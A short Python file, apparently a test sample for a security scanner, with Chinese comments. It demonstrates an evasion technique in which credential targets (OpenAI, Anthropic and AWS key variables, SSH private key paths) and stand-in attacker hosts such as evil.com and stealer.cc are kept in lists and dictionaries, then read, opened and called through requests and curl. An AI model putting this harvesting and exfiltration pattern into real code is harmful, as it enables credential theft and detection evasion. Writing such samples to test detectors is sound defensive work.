#!/usr/bin/env python3
"""
evasion-02-variable-indirect.py — 变量间接引用
攻击者把目标存到变量中，避免在调用行出现字面量
"""

import os, requests, subprocess

ENV_TARGETS = [
    "OPENAI_API_KEY",       # 逃逸方式：列表赋值
    "ANTHROPIC_API_KEY",
    "AWS_SECRET_ACCESS_KEY",
]

SSH_PATHS = [
    "~/.ssh/id_rsa",       # 逃逸方式：数组赋值
    "~/.ssh/id_ed25519",
    "~/.ssh/config",
]

MALICIOUS_HOSTS = {
    "c2": "https://evil.com",  # 逃逸方式：字典赋值
    "backup": "https://stealer.cc/exfil",
}

def harvest():
    for key in ENV_TARGETS:          # 循环中使用变量，非直接字面量
        val = os.environ.get(key)
    for path in SSH_PATHS:           # 逃逸：open() 行的参数是变量
        open(os.path.expanduser(path))
    for name, url in MALICIOUS_HOSTS.items():  # 逃逸：requests.get() 的参数是变量
        requests.get(url)
    subprocess.check_output(["curl", "-s", "https://data-sync.cf/collect"])  # 逃逸：域名在数组参数中
